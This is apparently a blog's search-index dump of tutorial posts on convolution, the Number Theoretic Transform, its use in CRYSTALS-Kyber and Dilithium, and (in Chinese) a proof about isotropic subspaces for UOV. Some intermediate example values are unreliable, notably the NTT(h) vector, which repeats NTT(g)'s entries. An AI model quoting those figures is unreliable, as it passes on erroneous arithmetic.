0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Security Considerations: Why Negacyclic over Cyclic? While both cyclic and negacyclic convolutions can be accelerated by the NTT, lattice-based cryptography has a strong preference for the negacyclic ring $\\mathbb{Z}_q[x]/(x^n + 1)$. This choice is not arbitrary; it is rooted in important security considerations. The Vulnerability of $x^n - 1$ The polynomial $x^n - 1$ has a simple algebraic structure that can be exploited in certain attacks. For any $n$, it is reducible over the integers, as it always has the factor $(x - 1)$. The existence of this simple root ($x = 1$) allows an attacker to map polynomial operations into simpler integer operations by evaluating the polynomials at $x = 1$. This “polynomial evaluation” can leak information about the secret key, creating a vulnerability that undermines the security of the underlying hard problem. The Strength of Cyclotomic Polynomials In contrast, when $n$ is a power of two, the polynomial $\\Phi_{2n}(x) = x^n + 1$ is the $2n$-th cyclotomic polynomial. This polynomial is irreducible over the rational numbers. While it may be reducible over the finite field $\\mathbb{Z}_q$, its richer algebraic structure avoids the simple vulnerabilities associated with the $x = 1$ root. This makes the RLWE problem instantiated in the ring $\\mathbb{Z}_q[x]/(x^n + 1)$ harder and the resulting cryptosystems more robust against known algebraic attacks. This security advantage is the primary reason for the near-ubiquitous use of negacyclic convolution in modern lattice-based PQC. ","date":"2025-08-09","objectID":"/waytontt-part-0/:6:2","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Case Study: NTT in CRYSTALS-Kyber and Dilithium The practical implications of these algorithmic and security choices are best illustrated by examining the schemes selected by the U.S. National Institute of Standards and Technology (NIST) for standardization. NIST Standardization After a multi-year global competition, NIST selected CRYSTALS-Kyber as its standard for Key Encapsulation Mechanisms (KEMs) and CRYSTALS-Dilithium for digital signatures. Both are part of the CRYSTALS suite and are built on the hardness of problems over module lattices, a variant of ideal lattices. Shared Algebraic Structure A key design feature of the CRYSTALS suite is that both Kyber and Dilithium operate over the same polynomial ring: $\\mathbb{Z}_q[x]/(x^{256} + 1)$. This means that a highly optimized hardware or software implementation of the NTT for this specific ring can be reused for both key exchange and digital signatures, simplifying development and deployment. Kyber’s Parameters and the NTT “Mismatch” The parameters for Kyber provide a fascinating real-world example of the co-design process. For all its security levels, Kyber uses a polynomial degree of $n = 256$. The modulus, however, is $q = 3329$. Let’s check the negacyclic NTT condition from Section 4.3: $2n \\mid (q-1)$. $n = 256$, so $2n = 512$. $q - 1 = 3328$. We check if 512 divides 3328: $3328/512 = 6.5$. It does not. This reveals a crucial point: Kyber’s parameters are intentionally chosen to be “NTT-unfriendly” with respect to the textbook negacyclic NTT algorithm. The choice of $q = 3329$ was motivated by other factors, such as simplifying certain types of modular reduction and satisfying the requirements of the security proof. Kyber’s Solution This parameter mismatch does not mean the NTT cannot be used. Instead, it requires a more sophisticated algorithmic approach. The designers of Kyber employ a variant of the negacyclic convolution trick. Since $q \\equiv 1 \\pmod{n}$ but not $\\pmod{2n}$, a full set of $2n$-th roots of unity does not exist. However, by decomposing the degree-$d$ polynomial into its even and odd sub-parts, each of degree $d/2$, the multiplication can be expressed in terms of several cross-multiplications and additions between these smaller polynomials. This allows a “half-NTT” or incomplete NTT procedure to be used, leveraging the existing roots of unity to accelerate the multiplication of the sub-parts. This is a prime example of how theoretical algorithms are adapted to meet the complex, multi-faceted constraints of real-world cryptographic engineering. Dilithium’s Parameters CRYSTALS-Dilithium also operates over the ring with $n = 256$, but it uses a different, much larger prime modulus, $q = 2^{23} - 2^{13} + 1 = 8380417$. For this choice, $q - 1 = 8380416$. We check the condition $2n \\mid (q-1)$: $2n = 512$. $8380416/512 = 16368$. The condition holds. Therefore, Dilithium’s parameters are “NTT-friendly,” and it can use the standard negacyclic NTT algorithm without the complex workarounds required by Kyber. This difference in parameterization highlights the diverse design choices made even within a single cryptographic suite to optimize for different use cases (KEM vs. signatures). Scheme Security Level Degree ($n$) Modulus ($q$) Ring $n \\mid (q-1)$? $2n \\mid (q-1)$? Implemented NTT Strategy CRYSTALS-Kyber 512, 768, 1024 256 3329 $\\mathbb{Z}_q[x]/(x^{256} + 1)$ Yes (3328/256=13) No (3328/512=6.5) Incomplete / Adapted Negacyclic NTT CRYSTALS-Dilithium 2, 3, 5 256 8380417 $\\mathbb{Z}_q[x]/(x^{256} + 1)$ Yes Yes Standard Negacyclic NTT ","date":"2025-08-09","objectID":"/waytontt-part-0/:6:3","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Conclusion This report has traversed the landscape of convolution and the Number Theoretic Transform, from foundational algebraic definitions to the intricate algorithmic details that power modern secure communication. The journey reveals a deep and elegant interplay between abstract algebra, computational theory, and practical engineering. The analysis began by establishing a crucial conceptual link: the seemingly distinct operations of linear, cyclic, and negacyclic convolution are not merely procedural variants but are precise algebraic manifestations of polynomial multiplication within different rings. Linear convolution corresponds to the unconstrained ring $\\mathbb{Z}[x]$, while cyclic and negacyclic convolutions correspond to multiplication in the quotient rings $\\mathbb{Z}_q[x]/(x^n - 1)$ and $\\mathbb{Z}_q[x]/(x^n + 1)$, respectively. This understanding reframes the choice of a convolution algorithm as the selection of a specific mathematical world with its own unique rules. The Number Theoretic Transform was presented as a powerful tool for efficient computation within these finite algebraic worlds. As an analogue of the Discrete Fourier Transform operating over finite fields, the NTT inherits the quasi-linear $O(n \\log n)$ complexity of the Fast Fourier Transform while crucially eliminating the floating-point precision errors that are intolerable in cryptographic contexts. The core of the NTT’s power lies in the convolution theorem, which transforms the complex problem of convolution into a simple pointwise product. This was shown to be a direct consequence of the NTT’s interpretation as a change of basis—from the standard monomial basis to a more convenient evaluation basis defined by the primitive roots of unity. The practical implementation of the NTT through fast algorithms like the Cooley-Tukey and Gentleman-Sande methods, along with the nuances of in-place computation via bit-reversal, demonstrates the sophisticated engineering required to translate theory into high-performance code. The final application to post-quantum cryptography highlights the pinnacle of this synthesis. The design of NIST-standardized schemes like CRYSTALS-Kyber is a testament to the co-design of security and algorithms. The choice of the negacyclic ring $\\mathbb{Z}_q[x]/(x^n + 1)$ is driven by security considerations, while the choice of the modulus $q$ and the specific formulation of the NTT algorithm are products of a complex optimization across security, correctness, and performance. As the global transition to post-quantum cryptography accelerates, the importance of these concepts will only grow. The efficiency of NTT implementations will directly impact the viability of secure systems in a vast range of applications, from resource-constrained IoT devices to large-scale cloud infrastructure. Continued research into optimizing these algorithms, both in software and dedicated hardware, will remain a critical frontier, ensuring that the mathematical elegance of convolution and the Number Theoretic Transform continues to provide the foundation for a secure digital future. ","date":"2025-08-09","objectID":"/waytontt-part-0/:7:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Way To NTT…… Note The Number Theoretic Transform (NTT) is a powerful mathematical tool that has become increasingly important in developing Post Quantum Cryptography (PQC) and Homomorphic Encryption (HE). ","date":"2025-08-08","objectID":"/waytofft-part-2/:0:0","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Review Maybe those are all you need link1,link2. ","date":"2025-08-08","objectID":"/waytofft-part-2/:1:0","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Notation Textbook-style Convolution linear convolution cyclic convolution Negacyclic Convolution ","date":"2025-08-08","objectID":"/waytofft-part-2/:1:1","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Review - Linear Convolution Converting Coefficients Multiplication into Vector Multiplication. Polynomial multiplication: Having $G(x)$ and $H(x)$ as polynomials of degree $n-1$ in the ring $\\mathbb{Z_q} $$x$$$ where q $\\in \\mathbb{Z}$ and $x$ is the polynomial variable. Generally speaking, a Polynomial Multiplication of $G(x)$ and $H(x)$ is defined as: $$Y(x) = G(x)\\cdot H(x) = \\sum_{k=0}^{2(n-1)}y_kx^k$$ where $y_k = \\sum_{i=0}^{k} g_i h_{k-i} \\mod q$, $g$ and $h$ are the polynomial coefficients of $G(x)$ and $H(x)$ respectively. About $y_k = \\sum_{i=0}^{k} g_i h_{k-i} \\mod q$ Simply This is merely a symbolic expression used to describe the final result. Think about what happens when you manually multiply two polynomials, $G(x)$ and $H(x)$. How do you get the final term for $x^k$? You get it by finding every pair of terms—one from $G(x)$ and one from $H(x)$—whose exponents add up to exactly $k$. Specifically, to get an $x^k$ term, you must multiply a term like $g_ix^i$ from G(x) with a term like $h_jx^j$ from $H(x)$ where $i+j=k$. The formula is simply a systematic way of finding and adding up all these pairs. $$ y_k = \\sum_{i=0}^{k} g_i h_{k-i} $$ This formula iterates through all the possibilities: When $i=0$, it pairs the constant term from $G(x)$ (coefficient $g_{0}$) with the $x^k$ term from $H(x)$ (coefficient $h^k$). This gives you the product $g_{0}h^{k}$. When $i=1$, it pairs the $x^1$ term from $G(x)$ (coefficient $g_{1}$) with the $x^{k−1}$ term from $H(x)$ (coefficient $h^{k−1}$). This gives you $g_{1}h^{k−1}$. …and so on. This continues until $i=k$, pairing the $x^{k}$ term from $G(x)$ (coefficient $g_{k}$) with the constant term from $H(x)$ (coefficient $h_{0}$), which gives you $g_{k}h^{0}$. The final coefficient, $y_k$, is just the sum of all these products. The formula is the compact, formal way of writing this exact process, which is also known as a discrete convolution. So, just import some notation about coefficient vector. We can convert Coefficients Multiplication into Vector Multiplication. $$ y[k]= \\boldsymbol{g} \\star \\boldsymbol{h}[k] = \\sum_{i=0}^{k}g[i]h[k-i] $$Of course. The formula you’ve shown is a discrete linear convolution. While it’s not a simple one-to-one vector multiplication, it can be understood as a form of vector multiplication in three main ways. Understood as a Series of Dot Products We can think of the calculation of each output element y[k] as a single vector dot product. The formula is: $y[k] = \\sum_{i=0}^{k} g[i]h[k-i] = g[0]h[k] + g[1]h[k-1] + \\dots + g[k]h[0]$ To calculate y[k], we need two vectors: The first k+1 elements of vector g: [g[0], g[1], ..., g[k]] The first k+1 elements of vector h, but reversed: [h[k], h[k-1], ..., h[0]] Then, y[k] is simply the dot product of these two vectors. Intuition: This is known as the “Flip and Slide” method. Imagine flipping the vector h and then sliding it across the vector g one step at a time. At each step, the dot product of the overlapping parts is calculated, which gives one element of the resulting vector y. Understood as Matrix-Vector Multiplication This is the most direct algebraic representation. We can expand one of the vectors (e.g., g) into a special matrix called a Toeplitz Matrix or Convolution Matrix. The entire convolution operation then becomes a single matrix-vector multiplication. Let’s assume g = [g₀, g₁, g₂] and h = [h₀, h₁, h₂]. The result of the linear convolution, y, will have a length of (3+3-1) = 5. We can construct the following matrix-vector multiplication: $$ \\begin{pmatrix} y_0 \\\\\\\\ y_1 \\\\\\\\ y_2 \\\\\\\\ y_3 \\\\\\\\ y_4 \\end{pmatrix} = \\begin{pmatrix} g_0 \u0026 0 \u0026 0 \\\\\\\\ g_1 \u0026 g_0 \u0026 0 \\\\\\\\ g_2 \u0026 g_1 \u0026 g_0 \\\\\\\\ 0 \u0026 g_2 \u0026 g_1 \\\\\\\\ 0 \u0026 0 \u0026 g_2 \\end{pmatrix} \\begin{pmatrix} h_0 \\\\\\\\ h_1 \\\\\\\\ h_2 \\end{pmatrix} $$If you work out the matrix multiplication, you will find that the results match the convolution definition exactly: $y_0 = g_0 h_0$ $y_1 = g_1 h_0 + g_0 h_1$ $y_2 = g_2 h_0 + g_1 h_1 + g_0 h_2$ …and so on. This me","date":"2025-08-08","objectID":"/waytofft-part-2/:1:2","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Review - Cyclic Convolution Positive Wrapped Convolution as $PWC(x)$ Suppose that $G(x)$ and $H(x)$ are polynomials of degree $n-1$ in the quotient ring $\\mathbb{Z_{q}}[x]/(x^{n}-1)$ where $q \\in \\mathbb{Z}$. A Cyclic Convolution or positive wrapped convolution is defined as: $$PWC(x) = \\sum_{k=0}^{n-1} c_{k}x^{k}$$ where $c_{k}= \\sum_{i=0}^{k}g_{i}h_{k-i} + \\sum_{i=k+1}^{n-1} g_{i}h_{k+n-i}$. If $Y(x)$ is the result of their linear convolution in the ring $\\mathbb{Z}_{q}[x]$, it also can be defined as: $$PWC(x) = Y(x) \\mod (x^{n} - 1)$$ ","date":"2025-08-08","objectID":"/waytofft-part-2/:1:3","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Review - Negacyclic Convolution Definition 2.3. Suppose that $G(x)$ and $H(x)$ are polynomials of degree $n-1$ in the quotient ring $\\mathbb{Z}[x]/(x^{n}+1)$ where $q \\in \\mathbb{Z}$. A negacyclic convolution or negative wrapped convolution, $\\operatorname{NWC}(x)$ is defined as: $$ \\operatorname{NWC}(x)=\\sum_{k=0}^{n-1}c_{k}x^{k} $$ where $c_{k}=\\sum_{i=0}^{k}g_{i}h_{k-i}-\\sum_{i=k+1}^{n-1}g_{i}h_{k+n-i} \\mod q$. If $Y(x)$ is the result of their linear convolution in the ring $\\mathbb{Z}[x]$, it also can be defined as $$ \\operatorname{NWC}(x)=Y(x) \\bmod (x^{n}+1)$$ Key Observation The above is a brief description of polynomial multiplication. ","date":"2025-08-08","objectID":"/waytofft-part-2/:1:4","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Review - NTT-Based Convolution. Number Theoretic Transform Based on $\\omega$ ","date":"2025-08-08","objectID":"/waytofft-part-2/:1:5","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"Review - Fast NTT ","date":"2025-08-08","objectID":"/waytofft-part-2/:1:6","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"3. NTT-Based Convolutions ","date":"2025-08-08","objectID":"/waytofft-part-2/:2:0","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"3.1 Primitive n-th Root of Unity Let $\\mathbb{Z}_q$ be the integer ring modulo $q$. An element $\\omega \\in \\mathbb{Z}_q$ is called a primitive $n$-th root of unity if: $$ \\omega^n \\equiv 1 \\pmod{q} $$ and $$ \\omega^k \\not\\equiv 1 \\pmod{q} \\quad \\text{for all } k \u003c n. $$ Example (Kyber-style parameters, but small $n$ for illustration): In $\\mathbb{Z}_{7681}$, for $n = 4$, the 4-th roots of unity are ${3383, 4298, 7680}$. Only $3383$ and $4298$ are primitive. These $\\omega$ values are the “twiddle factors” for NTT. ","date":"2025-08-08","objectID":"/waytofft-part-2/:2:1","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"3.2 NTT for Positive-Wrapped (Cyclic) Convolution The Number Theoretic Transform of $a = [a_0, \\dots, a_{n-1}]$ is: $$ \\hat{a_j} = \\sum_{i=0}^{n-1} \\omega^{ij} a_i \\pmod{q}, \\quad j = 0,\\dots, n-1 $$ This is DFT in the modular world. Inverse NTT (INTT) replaces $\\omega$ with $\\omega^{-1}$ and multiplies by $n^{-1} \\pmod{q}$. NTT Convolution Theorem For $a, b \\in \\mathbb{Z}_q^n$: $$ c = \\operatorname{INTT}(\\operatorname{NTT}(a) \\circ \\operatorname{NTT}(b)) $$where $\\circ` = elementwise multiplication. Example: Using $n=4$, $q=7681$, $\\omega=3383$, $g = [1, 2, 3, 4]$, $h = [5, 6, 7, 8]$ ⇒ NTT(g) = [10, 913, 7679, 6764], NTT(h) = [26, 913, 7679, 6764] ⇒ elementwise multiply, INTT → cyclic convolution [66, 68, 66, 60]. ","date":"2025-08-08","objectID":"/waytofft-part-2/:2:2","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"3.3 NTT for Negative-Wrapped (Negacyclic) Convolution For rings $\\mathbb{Z}_q[x]/(x^n + 1)$, we need the primitive $2n$-th root of unity $\\psi$: $$ \\psi^2 \\equiv \\omega \\pmod{q}, \\quad \\psi^n \\equiv -1 \\pmod{q} $$The negative-wrapped NTT is: $$ \\hat{a_j} = \\sum_{i=0}^{n-1} \\psi^{2ij + i} a_i \\pmod{q} $$Inverse uses $\\psi^{-1}$ and $n^{-1}$. Negacyclic Convolution Theorem Example: $n=4$, $q=7681$, $\\omega=3383$, choose $\\psi=1925$. $\\text{NTT}\\psi(g) = [1467, 2807, 3471, 7621]$ $\\text{NTT}\\psi(h) = [2489, 7489, 6478, 6607]$ Multiply elementwise, apply $\\text{INTT}_\\psi$ → [−56, −36, 2, 60]. ","date":"2025-08-08","objectID":"/waytofft-part-2/:2:3","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"3.4 Choosing the Modulus $q$ For PWC-NTT (cyclic convolution): $n \\mid (q-1)$. For NWC-NTT (negacyclic convolution): $2n \\mid (q-1)$. Example PQC parameters: Scheme n q PWC? NWC? Kyber V3 256 3329 ✔ ✘ Dilithium 256 8380417 ✔ ✔ ","date":"2025-08-08","objectID":"/waytofft-part-2/:2:4","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"4. Fast NTT: FFT-Style Acceleration Direct NTT = $O(n^2)$ complexity. FFT-style divide and conquer gives $O(n\\log n)$. ","date":"2025-08-08","objectID":"/waytofft-part-2/:3:0","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"4.1 Cooley–Tukey (CT) Butterfly for NTT Splits even/odd indices: $$ \\hat{a_j} = A_j + \\psi^{2j+1} B_j $$ $$ \\hat{a_{j+n/2}} = A_j - \\psi^{2j+1} B_j $$ Requires inputs in Normal Order (NO), outputs in Bit-Reversed Order (BO). ","date":"2025-08-08","objectID":"/waytofft-part-2/:3:1","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"4.2 Gentleman–Sande (GS) Butterfly for INTT Splits top/bottom halves: $$ a_{2i} = (A_i + B_i)\\psi^{-2i} $$ $$ a_{2i+1} = (A_i - B_i)\\psi^{-2i} $$ Takes BO input, outputs NO. ","date":"2025-08-08","objectID":"/waytofft-part-2/:3:2","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"4.3 Polynomial Multiplication via CT + GS CT butterfly for NTT(a), NTT(b) Elementwise multiply results GS butterfly for INTT This reduces modular polynomial multiplication from $O(n^2)$ → $O(n\\log n)$. ","date":"2025-08-08","objectID":"/waytofft-part-2/:3:3","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"4.4 Normal Order (NO) and Bit-Reversed Order (BO) NO: Standard indexing [0,1,2,…,n-1] BO: Reverse the binary representation of the index. Example $n=4$: NO = [0, 1, 2, 3] BO = [0, 2, 1, 3] CT: NO → BO GS: BO → NO NTT ≈ modular DFT for polynomials $\\omega$ → primitive $n$-th root of unity (cyclic conv) $\\psi$ → primitive $2n$-th root (negacyclic conv) CT butterfly for forward transform, GS butterfly for inverse NO/BO ordering is essential for implementation $O(n\\log n)$ complexity makes it usable in PQC lattice schemes ","date":"2025-08-08","objectID":"/waytofft-part-2/:3:4","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"summary FFT-style NTT algorithm or Fast-NTT is particularly useful in lattice-based cryptography. :) ","date":"2025-08-08","objectID":"/waytofft-part-2/:4:0","tags":[],"title":"WayToFFT Part 2","uri":"/waytofft-part-2/"},{"categories":[],"content":"By which to Rule Them All 上回书说到 UOV … ","date":"2025-03-16","objectID":"/vectorspace-matters/:0:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"基础 ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"有限域 (Finite Field) ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:1","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"向量空间 ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:2","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"双线性形式（Bilinear Form） 设域为有限域 $\\mathbb{F}_q$，考虑向量空间 $\\mathbb{F}_q^n$。双线性形式是一个函数： $$ B : \\mathbb{F}_q^n \\times \\mathbb{F}_q^n \\to \\mathbb{F}_q $$满足以下两个条件： 对每个固定的 $y \\in \\mathbb{F}_q^n$，映射 $x \\mapsto B(x, y)$ 是 $\\mathbb{F}_q$-线性的； 对每个固定的 $x \\in \\mathbb{F}_q^n$，映射 $y \\mapsto B(x, y)$ 也是 $\\mathbb{F}_q$-线性的。 也就是说，$B$ 关于两个变量都是线性的。 对称双线性形式与二次型的关联 对称双线性形式（Symmetric Bilinear Form） 一个映射 $f: \\mathbb{K}^n \\times \\mathbb{K}^n \\to \\mathbb{K}$ 满足： 双线性性： $$ f(a\\mathbf{u} + b\\mathbf{v}, \\mathbf{w}) = a f(\\mathbf{u}, \\mathbf{w}) + b f(\\mathbf{v}, \\mathbf{w}) $$ （对第一个变量的线性性） 对称性： $$ f(\\mathbf{u}, \\mathbf{v}) = f(\\mathbf{v}, \\mathbf{u}) $$ 传导后可得，对于两个变量均为线性。 “关联\"的本质 二次型 $Q$ 和对称双线性形式 $f$ 通过 极化恒等式（Polarization Identity）联系： $$ \\boxed{f(\\mathbf{u}, \\mathbf{v}) = \\frac{1}{2} \\left[ Q(\\mathbf{u} + \\mathbf{v}) - Q(\\mathbf{u}) - Q(\\mathbf{v}) \\right]} $$反之，二次型 $Q$ 可由 $f$ 直接导出： $$ Q(\\mathbf{u}) = f(\\mathbf{u}, \\mathbf{u}) $$关键关系总结 方向 公式 含义 $Q \\to f$ $f(\\mathbf{u},\\mathbf{v}) = \\frac{1}{2}[Q(\\mathbf{u}+\\mathbf{v}) - Q(\\mathbf{u}) - Q(\\mathbf{v})]$ 从二次型恢复双线性形式 $f \\to Q$ $Q(\\mathbf{u}) = f(\\mathbf{u},\\mathbf{u})$ 从双线性形式定义二次型 二次型与其极化形式（Polarization） 给定一个二次型（Quadratic Form）： $$ f : \\mathbb{F}_q^n \\to \\mathbb{F}_q $$我们定义其极化形式（polar form）或称为极形式 $f^*$ 为： $$ f^\\*(x, y) = f(x + y) - f(x) - f(y) $$这个形式具有以下性质： $f^*(x, y)$ 是一个双线性形式； 若 $f$ 是正规二次型（即 $f(ax) = a^2 f(x)$），则 $f^*$ 是对称的双线性形式，即： $$ f^{\\*}(x, y) = f^{\\*}(y, x) $$ ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:3","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"举例（矩阵表示） 设 $f(x) = x^\\top M x$，其中 $M$ 是一个 $n \\times n$ 的矩阵，定义在 $\\mathbb{F}_q$ 上，则： $$ \\begin{aligned} f^*(x, y) \u0026= f(x + y) - f(x) - f(y) \\\\\\\\ \u0026= (x + y)^\\top M (x + y) - x^\\top M x - y^\\top M y \\\\\\\\ \u0026= x^\\top M y + y^\\top M x \\end{aligned} $$如果 $M$ 是对称的（即 $M^\\top = M$），则有： $$ f^*(x, y) = 2 x^\\top M y $$注意：在特征为 2 的域中（即 $q$ 为 2 的幂），$2 \\equiv 0$，所以： $$ f^*(x, y) = x^\\top M y + y^\\top M x = 0 \\quad \\text{（如果 $M$ 是对称的）} $$这使得在奇特性域（特征为 2）中，二次型与其极形式的关系非常特殊，常常导致极形式退化。 ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:4","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"子空间 子空间是 $F_q^n$中闭合于加法和标量乘法的子集。关键类型包括： 各向同性子空间：存在非零向量 x 使 f(x)=0。 全各向同性子空间：所有向量 x 满足 f(x)=0，如UOV中的油子空间 O。 各向异性子空间：非零向量 x 满足 f(x)≠0。 全各向同性子空间的维数上限为 $⌊n/2⌋$，对UOV的安全性分析至关重要。 ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:5","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"矩阵核 ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:6","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"秩 矩阵的秩是其最大线性无关行或列数。二次形式的秩为其关联矩阵的秩，在奇特性场中保持不变。 ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:7","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"一般线性群 $GL_n(F_q)$ 由 Fq 上所有可逆 n×n 矩阵组成的群，出现在VOX方案的变换矩阵中。 One Vector to rule them all ","date":"2025-03-16","objectID":"/vectorspace-matters/:1:8","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Lemma 1 略. ","date":"2025-03-16","objectID":"/vectorspace-matters/:2:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"Lemma 2 说明了 所谓迷向子空间 (Isotropic Subspace) ，即视为一组基向量矩阵的子空间表达，有其 rank 的特征 $r \\gt n// 2$. ","date":"2025-03-16","objectID":"/vectorspace-matters/:3:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"📜引理陈述 设 $f$ 是定义在域 $\\mathbb{K}$ 上的秩为 $n$ 的二次型，$\\mathcal{O}$ 是其任意全迷向子空间，则： $$ \\dim(\\mathcal{O}) \\leq \\left\\lfloor \\frac{n}{2} \\right\\rfloor $$","date":"2025-03-16","objectID":"/vectorspace-matters/:4:0","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"关键概念回顾 1. 二次型与对称双线性形式 二次型：函数 $Q: \\mathbb{K}^n \\to \\mathbb{K}$，可表示为 $Q(\\mathbf{x}) = \\mathbf{x}^T A \\mathbf{x}$（$A$ 对称矩阵） 关联的对称双线性形式 $f$： $$ f(\\mathbf{u}, \\mathbf{v}) = \\frac{1}{2} \\left[ Q(\\mathbf{u} + \\mathbf{v}) - Q(\\mathbf{u}) - Q(\\mathbf{v}) \\right] $$ 满足： 双线性性：$f(a\\mathbf{u}+b\\mathbf{v},\\mathbf{w}) = af(\\mathbf{u},\\mathbf{w}) + bf(\\mathbf{v},\\mathbf{w})$ 对称性：$f(\\mathbf{u},\\mathbf{v}) = f(\\mathbf{v},\\mathbf{u})$ 关系：$Q(\\mathbf{u}) = f(\\mathbf{u}, \\mathbf{u})$ 2. 全迷向子空间 子空间 $\\mathcal{O} \\subseteq \\mathbb{K}^n$ 满足： $$ \\forall \\mathbf{u}, \\mathbf{v} \\in \\mathcal{O}, \\quad f(\\mathbf{u}, \\mathbf{v}) = 0 $$3. 矩阵表示 在基 ${\\mathbf{v_1},\\dots,\\mathbf{v_n}}$ 下，$f$ 的矩阵为： $$ A_{n \\times n} = (a_{ij}) , \\quad a_{ij} = f(\\mathbf{v_i}, \\mathbf{v_j}) $$","date":"2025-03-16","objectID":"/vectorspace-matters/:4:1","tags":[],"title":"Vectorspace Matters","uri":"/vectorspace-matters/"},{"categories":[],"content":"证明步骤（反证法） 步骤 1：反证假设 假设 $\\dim(\\mathcal{O}) = r \u003e \\left\\lfloor \\frac{n}{2} \\right\\rfloor$，则： 当 $n$ 偶：$r \u003e \\frac{n}{2}$ 当 $n$ 奇：$r \u003e \\frac{n-1}{2}$ 步骤 2：基扩充 取 $\\mathcal{O}$ 的基 $B = {\\mathbf{v_1},\\dots,\\mathbf{v_r}}$，扩充为 $\\mathbb{K}^n$ 的基： $$ \\hat{B} = \\{\\mathbf{v_1},\\dots,\\mathbf{v_r}, \\mathbf{v_{r+1}},\\dots,\\mathbf{v_n}\\} $$步骤 3：构造零块矩阵 在基 $\\hat{B}$ 下，$f$ 的矩阵表示为： $$ A = \\begin{pmatrix} \\boxed{\\text{0}} \u0026 {\\*} \\\\\\\\ {\\*} \u0026 {\\*} \\end{pmatrix} $$ 其中左上角的 $r \\times r$ 子矩阵为： $$ \\begin{pmatrix} f(\\mathbf{v_1},\\mathbf{v_1}) \u0026 \\cdots \u0026 f(\\mathbf{v_1},\\mathbf{v_r}) \\\\\\\\ \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ f(\\mathbf{v_r},\\mathbf{v_1}) \u0026 \\cdots \u0026 f(\\mathbf{v_r},\\mathbf{v_r}) \\end{pmatrix} = \\begin{pmatrix} 0 \u0026 \\cdots \u0026 0 \\\\\\\\ \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ 0 \u0026 \\cdots \u0026 0 \\end{pmatrix} $$ 零块形成原因： $$ \\forall i,j \\leq r,\\ \\mathbf{v}_i,\\mathbf{v}_j \\in \\mathcal{O} \\implies f(\\mathbf{v}_i,\\mathbf{v}_j) = 0 $$步骤 4：秩分析 矩阵 $A$ 的结构： $$ A = \\begin{pmatrix} 0_{r \\times r} \u0026 B_{r \\times (n-r)} \\\\ C_{(n-r) \\times r} \u0026 D_{(n-r) \\times (n-r)} \\end{pmatrix} $$ 前 $r$ 行：形如 $(0,\\dots,0, b_{1,r+1},\\dots,b_{1n})$ 张成空间维数 $\\leq n - r$ 后 $n-r$ 行：无特殊约束 张成空间维数 $\\leq n - r$ 总秩上界： $$ \\operatorname{rank}(A) \\leq \\underbrace{(n - r)} + {\\underbrace{(n - r)}} = 2(n - r) $$ 步骤 5：导出矛盾 由假设 $r \u003e \\left\\lfloor \\frac{n}{2} \\right\\rfloor$ 可得： $$ r \u003e \\frac{n}{2} \\implies n - r \u003c \\frac{n}{2} \\implies 2(n - r) \u003c n $$ 因此： $$ \\operatorname{rank}(A) \\leq 2(n - r) \u003c n $$ 但 $f$ 的秩为 $n$，要求 $\\operatorname{rank}(A) = n$，矛盾！ ","date":"2025-03-16","objectID":"/vectorspace-matters/:4:2","tags":[],"title":"Vectorspace 